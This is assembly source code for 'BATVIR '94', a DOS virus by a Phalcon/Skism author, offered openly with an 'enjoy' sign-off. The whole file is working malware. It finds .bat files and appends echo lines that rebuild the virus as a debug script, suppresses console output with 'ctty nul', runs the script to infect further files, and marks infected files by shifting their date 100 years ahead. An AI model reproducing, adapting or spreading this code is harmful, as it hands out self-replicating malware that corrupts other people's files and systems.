;             [BATVIR] '94 (c) 1994 Stormbringer [Phalcon/Skism]
;
;   This virus is a bit cheesy, but hell.... Believe it or not, I got bored 
;enough to write a direct action .BAT infector in assembly.  It infects files 
;by basically creating a debug script of itself, echoing it out to a file,
;then running it using debug to infect more files.  I doubt anyone has
;done this in quite this manner, so....
;
;
;
;enjoy,
;Stormbringer [P/S]


.model tiny
.radix 16
.code
        org 100
start:
        mov     ah,4e
        mov     dx,offset filemask

FindFile:        
        int     21
        jc      NoMoreFiles

        mov     dx,9e
        mov     ax,3d02
        int     21
        jc      DoneInfect
        xchg    bx,ax

        mov     ax,5700
        int     21
        push    cx dx

        cmp     dh,80
        jae     AlreadyInfected


        mov     ax,4202
        xor     cx,cx
        xor     dx,dx
        int     21

        mov     si,100
        mov     di,offset end_virus
        mov     cx,end_virus-start
        push    bx
        call    Convert2Hex
        pop     bx

        call    InfectBat


        pop     dx
        add     dh,0c8  ;Add 100 years to filedate
        push    dx

AlreadyInfected:
        pop     dx cx
        mov     ax,5701
        int     21

        mov     ah,3e
        int     21

DoneInfect:        
        mov     ah,4f
        jmp     FindFile

NoMoreFiles:
        mov     ax,4c00
        int     21


Convert2Hex:
        push    cx
        lodsb
        mov     bx,ax
        mov     cx,4
        shr     al,cl        
        push    ax
        call    convert2asc
        stosb
        pop     ax
        shl     al,cl
        sub     bl,al
        xchg    al,bl
        call    convert2asc
        stosb
        mov     ax,' '
        stosb
        pop     cx
        loop    Convert2hex
        stosb
        stosb
        ret

convert2asc:
        cmp     al,0a
        jae     letter
        add     al,'0'
        ret
letter:
        add     al,'A'-0a
        ret

InfectBat:
        mov     ah,40
        mov     dx,offset startinf
        mov     cx,endsinf-startinf     ;Write start of infection
        int     21
        mov     dx,offset end_virus

   DataLoop:
        push    dx        
        call    calcloc
        call    writeecho1        
        pop     dx        
        push    dx

        mov     cx,di
        sub     cx,dx
        cmp     cx,60d
        jb      WriteData
        mov     cx,60d
WriteData:
        mov     ah,40
        int     21

        push    ax
        call    WriteRedirect
        pop     ax

        pop     dx        
        add     dx,ax
        cmp     dx,di
        jae     WriteGoExitCommands
        jmp     DataLoop


WriteGoExitCommands:
        call    writeecho2

        mov     ah,40
        mov     dx,offset govirus
        mov     cx,1
        int     21

        call    WriteRedirect
        call    writeecho2

        mov     ah,40
        mov     dx,offset govirus+1
        mov     cx,1
        int     21

        call    WriteRedirect

        mov     dx,offset batchender
        mov     cx,endbatend-batchender
        mov     ah,40
        int     21

        ret
        
WriteRedirect:
        mov     dx,offset echodest
        mov     cx,endvirusfile-echodest
        mov     ah,40                   
        int     21
        ret

WriteEcho1:
        mov     cx,enddb-databyte
        jmp     short WriteEcho
WriteEcho2:
        mov     cx,5
WriteEcho:
        mov     dx,offset databyte
        mov     ah,40
        int     21
        ret


calcloc:
        push    ax bx cx dx si di
        sub     dx,offset end_virus
        mov     ax,dx
        mov     cx,3
        xor     dx,dx
        div     cx
        mov     dx,ax
        add     dx,100
        mov     di,offset temp
        mov     si,offset location
        xchg    dh,dl
        mov     location,dx
        mov     cx,2
        call    Convert2Hex
        mov     di,offset buffer1
        mov     si,offset temp
        movsw
        lodsb
        movsw
        pop     di si dx cx bx ax
        ret


Filemask        db      '*.bat',0

govirus         db      'gq'
endgovirus:

databyte        db      'echo e'
buffer1         db      '0100 '
enddb:

echodest        db      ' >>'
VirusFile       db      'batvir.94',0dh,0a
EndVirusFile:

Batchender      db      'debug<batvir.94',0dh,0a ,'del batvir.94',0dh,0a
                db      'ctty con',0dh,0a
endbatend:

startinf:        
        db      0dh,0a,'@echo off',0dh,0a
        db      'ctty nul',0dh,0a
Credits db      'rem [BATVIR] ''94 (c) Stormbringer [P/S]',0dh,0a
endsinf:
location        dw      0
temp            dw      0,0,0,0

end_virus:
end start
